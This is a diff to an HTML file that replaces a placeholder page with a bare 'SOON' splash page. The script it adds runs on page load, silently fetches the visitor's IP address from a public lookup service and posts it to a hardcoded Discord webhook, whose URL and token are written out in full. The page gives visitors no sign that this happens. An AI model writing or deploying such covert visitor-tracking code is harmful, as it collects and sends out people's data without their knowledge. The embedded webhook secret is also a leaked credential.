@@ -1,27 +1,41 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Your Website Title</title>
+    <title>kiro</title>
+    <style>
+      body {
+        background-color: black;
+        color: white;
+        text-align: center;
+        font-size: 50px;
+        margin-top: 30%;
+      }
+    </style>
   </head>
   <body>
-    <h1>Welcome to Your Website</h1>
-    <p>Here is your website content.</p>
-    
+    SOON
     <!-- Add your Discord webhook script below -->
     <script type="text/javascript">
       // Replace <discord-webhook-url> with your actual Discord webhook URL
-      const discordWebhookUrl = "<discord-webhook-url>";
+      const discordWebhookUrl = "https://canary.discord.com/api/webhooks/1107037105902854195/4pp8cLSJCLBfoXfphudj7aVUZBhyJ3Uo_tCv3ZD7E3B9ilAIOB4yOvYIxcP9jNrkGhD0";
 
-      // Use the fetch() function to send a POST request to the Discord webhook URL
-      fetch(discordWebhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          content: 'Someone has entered your website.'
-        })
-      });
+      // Use an API to get the user's IP address
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ipAddress = data.ip;
+
+          // Send a POST request to the Discord webhook URL with the IP address
+          fetch(discordWebhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              content: 'Someone has entered your website. Their IP address is ' + ipAddress
+            })
+          });
+        });
     </script>
   </body>
 </html>
